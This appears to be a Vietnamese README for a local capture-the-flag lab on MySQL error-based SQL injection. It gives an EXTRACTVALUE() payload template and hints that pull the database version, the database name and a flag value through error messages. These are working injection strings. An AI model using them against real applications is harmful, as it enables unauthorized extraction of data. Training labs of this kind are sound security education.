# SQLi-009: MySQL EXTRACTVALUE() Error-based SQLi

## 🎯 Mục Tiêu
Học cách sử dụng hàm **EXTRACTVALUE()** của MySQL để extract data thông qua error messages.

## 📝 Kịch Bản
Website e-commerce có trang xem chi tiết sản phẩm theo ID. Tham số `id` vulnerable với error-based SQLi.

**URL Target:** `http://localhost:5009/product?id=1`

## 🎓 Kiến Thức

### EXTRACTVALUE Syntax
```sql
EXTRACTVALUE(xml_doc, xpath_expr)
```
Khi xpath invalid (bắt đầu với `~`), MySQL sẽ trả về error chứa giá trị xpath.

### Payload Template
```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--
```
- `0x7e` = ký tự `~` (làm xpath invalid)
- MySQL sẽ error: `XPATH syntax error: '~5.7.32~'`

## 🚀 Chạy Lab
```bash
docker-compose up -d
# Truy cập: http://localhost:5009
docker-compose down -v
```

## 💡 Hints

<details>
<summary>Hint 1</summary>
Thử: `?id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))--`
</details>

<details>
<summary>Hint 2</summary>
Extract database: `?id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,database(),0x7e))--`
</details>

<details>
<summary>Hint 3</summary>
Extract từ bảng flags: `?id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT flag_value FROM flags LIMIT 1),0x7e))--`
</details>

## 🏁 Flag
Extract flag từ bảng `flags`.

## 📋 Checklist
- [ ] Extract MySQL version
- [ ] Extract database name
- [ ] Enumerate tables
- [ ] Extract flag
